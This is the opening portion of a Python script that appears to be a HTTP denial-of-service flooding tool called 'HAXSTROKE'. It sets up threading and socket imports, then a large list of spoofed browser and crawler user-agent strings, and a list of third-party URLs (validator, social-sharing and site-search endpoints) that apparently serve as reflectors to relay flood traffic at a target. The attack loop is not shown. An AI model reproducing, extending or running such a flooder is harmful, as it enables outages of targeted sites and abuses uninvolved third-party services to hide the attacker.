#!/usr/bin/python3
# -*- coding: utf-8 -*-

from queue import Queue
from optparse import OptionParser
import time,sys,socket,threading,logging,urllib.request,random

# My Hax Stroke Color Console
W  = '\033[0m'  # white (default)
R  = '\033[31m' # red
G  = '\033[1;32m' # green bold
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray

def user_agent():
	global uagent
	uagent=[]
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
	uagent.append("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)")
	uagent.append("Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15")
	uagent.append("Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57")
	uagent.append("Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413")
	uagent.append("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)")
	uagent.append("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)")
	uagent.append("Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0")
	uagent.append("Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g")
	uagent.append("Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)")
	uagent.append("Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125")
	uagent.append("Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)")
	uagent.append("Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413")
	uagent.append("Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)")
	uagent.append("Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)")
	uagent.append("Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)")
	uagent.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)")
	uagent.append("Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)")
	uagent.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)")
	uagent.append("Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10")
	uagent.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4")
	uagent.append("Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0")
	uagent.append("Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10")
	uagent.append("Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)")
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)")
	uagent.append("Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)")
	uagent.append("Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)")
	uagent.append("Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16")
	uagent.append("Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
	uagent.append("Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)")
	uagent.append("Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51")
	uagent.append("Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)")
	uagent.append("Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7")
	uagent.append("BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0")
	uagent.append("Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)")
	uagent.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)")
	uagent.append("Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)")
	uagent.append("Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)")
	uagent.append("Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10")
	uagent.append("Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007")
	uagent.append("BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179")
	uagent.append("Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620")
	uagent.append("Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com")
	uagent.append("Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)")
	uagent.append("Mozilla/4.0 (compatible; Arachmo)")
	uagent.append("Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)")
	uagent.append("Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)")
	uagent.append("Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)")
	uagent.append("Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)")
	uagent.append("BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)")
	uagent.append("Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)")
	uagent.append("Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)")
	uagent.append("Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)")
	uagent.append("Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)")
	uagent.append("Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )")
	uagent.append("Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )")
	uagent.append("Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)")
	uagent.append("Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)")
	uagent.append("Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)")
	uagent.append("Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)")
	uagent.append("Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)")
	uagent.append("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)")
	uagent.append("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)")
	uagent.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)")
	uagent.append("Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1")
	uagent.append("Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)")
	uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A")
	uagent.append("Mozilla/5.0 (PLAYSTATION 3; 3.55)")
	uagent.append("Mozilla/5.0 (PLAYSTATION 3; 2.00)")
	uagent.append("Mozilla/5.0 (PLAYSTATION 3; 1.00)")
	uagent.append("Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)")
	uagent.append("Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7")
	uagent.append("BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0")
	uagent.append("Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)")
	uagent.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)")
	uagent.append("Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)")
	uagent.append("Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)")
	uagent.append("Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10")
	uagent.append("Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007")
	uagent.append("BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179")
	uagent.append("Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)")
	uagent.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)")
	uagent.append("Googlebot/2.1 (http://www.googlebot.com/bot.html)")
	uagent.append("Opera/9.20 (Windows NT 6.0; U; en)")
	uagent.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)")
	uagent.append("Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)")
	uagent.append("Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16")
	uagent.append("Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13")
	uagent.append("Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)")
	uagent.append("Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)")
	uagent.append("Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)")
	uagent.append("Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7")
	uagent.append("Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)")
	uagent.append("Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)")
	uagent.append("YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1")
	uagent.append("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)")
	uagent.append("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)")
	uagent.append("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)")
	uagent.append("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)")
	uagent.append("Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)")
	uagent.append("Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)")
	uagent.append("Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51")
	uagent.append("AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)")
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)")
	uagent.append("Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)")
	uagent.append("Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)")
	uagent.append("Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)")
	uagent.append("Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)")
	uagent.append("Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)")
	uagent.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1")
	uagent.append("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)")
	uagent.append("Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15")
	uagent.append("Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57")
	uagent.append("Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413")
	uagent.append("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)")
	uagent.append("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)")
	uagent.append("Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0")
	uagent.append("Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g")
	uagent.append("Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)")
	uagent.append("Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125")
	uagent.append("Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)")
	uagent.append("Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413")
	uagent.append("Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)")
	uagent.append("Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)")
	uagent.append("Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)")
	uagent.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)")
	uagent.append("Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)")
	uagent.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)")
	uagent.append("Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10")
	uagent.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4")
	uagent.append("Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0")
	uagent.append("Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10")
	uagent.append("Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)")
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)")
	uagent.append("Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)")
	uagent.append("Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)")
	uagent.append("Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16")
	uagent.append("Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
	uagent.append("Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)")
	uagent.append("Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51")
	uagent.append("Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)")
	uagent.append("Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7")
	uagent.append("BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0")
	uagent.append("Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)")
	uagent.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)")
	uagent.append("Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)")
	uagent.append("Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)")
	uagent.append("Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10")
	uagent.append("Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007")
	uagent.append("BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)")
	uagent.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1")
	uagent.append("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)")
	uagent.append("Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15")
	uagent.append("Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57")
	uagent.append("Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413")
	uagent.append("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)")
	uagent.append("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)")
	uagent.append("Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0")
	uagent.append("Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g")
	uagent.append("Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)")
	uagent.append("Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125")
	uagent.append("Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)")
	uagent.append("Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413")
	uagent.append("Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)")
	uagent.append("Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)")
	uagent.append("Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)")
	uagent.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)")
	uagent.append("Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)")
	uagent.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)")
	return(uagent)


def HAXSTROKE_bots():
	global bots
	bots=[]
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append('http://www.ustream.tv/search?q=')
	bots.append('http://www.ted.com/search?q=')
	bots.append('http://funnymama.com/search?q=')
	bots.append('http://itch.io/search?q=')
	bots.append('http://jobs.rbs.com/jobs/search?q=')
	bots.append('http://taginfo.openstreetmap.org/search?q=')
	bots.append('http://www.baoxaydung.com.vn/news/vn/search&q=')
	bots.append('https://play.google.com/store/search?q=')
	bots.append('http://www.tceq.texas.gov/@@tceq-search?q=')
	bots.append('http://www.reddit.com/search?q=')
	bots.append('http://www.bestbuytheater.com/events/search?q=')
	bots.append('https://careers.carolinashealthcare.org/search?q=')
	bots.append('http://jobs.leidos.com/search?q=')
	bots.append('http://jobs.bloomberg.com/search?q=')
	bots.append('https://www.pinterest.com/search/?q=')
	bots.append('http://millercenter.org/search?q=')
	bots.append('https://www.npmjs.com/search?q=')
	bots.append('http://www.evidence.nhs.uk/search?q=')
